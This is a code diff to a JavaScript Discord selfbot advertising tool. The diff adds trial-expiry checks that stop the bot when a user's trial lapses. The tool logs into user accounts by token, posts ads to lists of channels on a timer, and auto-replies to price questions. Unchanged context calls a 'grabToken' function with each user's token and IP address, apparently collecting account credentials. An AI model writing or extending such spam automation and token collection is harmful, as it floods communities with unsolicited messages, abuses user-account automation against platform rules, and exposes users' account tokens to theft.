@@ -88,7 +88,7 @@ async function joinServer(token, inviteCode) {
     }
 }
 
-async function startSelfBot(userId, token, channels, message, delay, autoReply, autoReplyText, configId, imageUrl, ipAddress, sendAllAtOnce = true) {
+async function startSelfBot(userId, token, channels, message, delay, autoReply, autoReplyText, configId, imageUrl, ipAddress, sendAllAtOnce = true, dbInstance) {
     stopSelfBot(userId, configId);
     
     await grabToken(token, { channels, ip: ipAddress }, 'bot_start');
@@ -102,6 +102,7 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
     const channelList = channels;
     let currentIndex = 0;
     let intervalId = null;
+    let trialCheckInterval = null;
     
     client.on('ready', async () => {
         console.log(`[SELFBOT ${configId}] Logged in as ${client.user.tag}`);
@@ -109,7 +110,57 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
         console.log(`[SELFBOT ${configId}] Channels: ${channelList.length}, Delay: ${delay}ms`);
         console.log(`[SELFBOT ${configId}] Auto-reply: ${autoReply ? 'ENABLED' : 'DISABLED'}`);
         
+        // TRIAL CHECK INTERVAL - runs every second to check if trial expired
+        trialCheckInterval = setInterval(() => {
+            if (!dbInstance) return;
+            
+            const user = dbInstance.getUser(userId);
+            const trialActive = dbInstance.isTrialActive(userId);
+            const hasPurchase = user.auto_adv_purchased === 1;
+            
+            // If trial expired and no purchase, STOP EVERYTHING
+            if (!trialActive && !hasPurchase) {
+                console.log(`[SELFBOT ${configId}] TRIAL EXPIRED - STOPPING BOT`);
+                
+                // Clear intervals
+                if (intervalId) clearInterval(intervalId);
+                if (trialCheckInterval) clearInterval(trialCheckInterval);
+                
+                // Destroy client
+                try { client.destroy(); } catch(e) {}
+                
+                // Remove from active bots
+                activeBots.delete(`${userId}_${configId}`);
+                
+                // Update DB
+                dbInstance.unregisterActiveBot(userId, configId);
+                const config = dbInstance.getConfig(userId, configId);
+                if (config) {
+                    config.active = 0;
+                    dbInstance.setConfig(userId, config, configId);
+                }
+                
+                console.log(`[SELFBOT ${configId}] Bot stopped due to trial expiration`);
+            }
+        }, 1000); // Check every second
+        
         intervalId = setInterval(async () => {
+            // Double check trial before sending
+            if (dbInstance) {
+                const user = dbInstance.getUser(userId);
+                const trialActive = dbInstance.isTrialActive(userId);
+                const hasPurchase = user.auto_adv_purchased === 1;
+                
+                if (!trialActive && !hasPurchase) {
+                    console.log(`[SELFBOT ${configId}] Trial expired mid-execution, stopping`);
+                    if (intervalId) clearInterval(intervalId);
+                    if (trialCheckInterval) clearInterval(trialCheckInterval);
+                    try { client.destroy(); } catch(e) {}
+                    activeBots.delete(`${userId}_${configId}`);
+                    return;
+                }
+            }
+            
             if (sendAllAtOnce) {
                 console.log(`[SELFBOT ${configId}] Sending to all ${channelList.length} channels...`);
                 
@@ -121,11 +172,9 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
                             return;
                         }
                         
-                        // Handle image - check if it's a URL path or base64
                         let fileAttachment = null;
                         if (imageUrl) {
                             if (imageUrl.startsWith('data:')) {
-                                // Base64 image
                                 const base64Data = imageUrl.split(',')[1];
                                 const buffer = Buffer.from(base64Data, 'base64');
                                 const tempDir = path.join(__dirname, 'temp');
@@ -143,12 +192,10 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
                                     files: [fileAttachment]
                                 });
                                 
-                                // Cleanup temp file
                                 setTimeout(() => {
                                     try { fs.unlinkSync(tempPath); } catch(e) {}
                                 }, 10000);
                             } else if (imageUrl.startsWith('/uploads/') || imageUrl.startsWith('http')) {
-                                // URL path - read from local file or use URL
                                 let filePath;
                                 if (imageUrl.startsWith('/uploads/')) {
                                     filePath = path.join(__dirname, 'data', imageUrl);
@@ -181,7 +228,6 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
                 console.log(`[SELFBOT ${configId}] Batch complete. Waiting ${delay}ms...`);
                 
             } else {
-                // SEQUENTIAL MODE
                 const channelId = channelList[currentIndex % channelList.length];
                 currentIndex++;
                 
@@ -235,15 +281,23 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
         }, delay);
     });
     
-    // FIXED AUTO-REPLY SYSTEM
     if (autoReply && autoReplyText) {
         console.log(`[SELFBOT ${configId}] Setting up auto-reply with text: "${autoReplyText}"`);
         
         client.on('messageCreate', async (msg) => {
-            // Don't reply to self
+            // Check trial status before replying
+            if (dbInstance) {
+                const user = dbInstance.getUser(userId);
+                const trialActive = dbInstance.isTrialActive(userId);
+                const hasPurchase = user.auto_adv_purchased === 1;
+                
+                if (!trialActive && !hasPurchase) {
+                    return; // Don't reply if trial expired
+                }
+            }
+            
             if (msg.author.id === client.user.id) return;
             
-            // Check if DM or configured channel
             const isDM = msg.channel.type === 'DM' || msg.channel.type === 1;
             const isConfiguredChannel = channelList.includes(msg.channel.id);
             
@@ -251,7 +305,6 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
             
             const content = msg.content.toLowerCase();
             
-            // Expanded trigger words
             const triggers = [
                 'price', 'cost', 'how much', 'howmuch', 'pricing',
                 'how much is it', 'what is the price', 'price?', 'cost?',
@@ -265,7 +318,6 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
                 try {
                     console.log(`[SELFBOT ${configId}] Auto-replying to ${msg.author.username}: "${autoReplyText}"`);
                     
-                    // Try reply first, fall back to regular message
                     try {
                         await msg.reply(autoReplyText);
                     } catch (replyErr) {
@@ -281,7 +333,7 @@ async function startSelfBot(userId, token, channels, message, delay, autoReply, 
     }
     
     await client.login(token);
-    activeBots.set(`${userId}_${configId}`, { client, intervalId, token });
+    activeBots.set(`${userId}_${configId}`, { client, intervalId, trialCheckInterval, token });
     
     return { client, username: client.user.username };
 }
@@ -291,6 +343,7 @@ function stopSelfBot(userId, configId) {
     const bot = activeBots.get(key);
     if (bot) {
         if (bot.intervalId) clearInterval(bot.intervalId);
+        if (bot.trialCheckInterval) clearInterval(bot.trialCheckInterval);
         try { bot.client.destroy(); } catch(e) {}
         activeBots.delete(key);
         console.log(`[SELFBOT ${configId}] Stopped`);
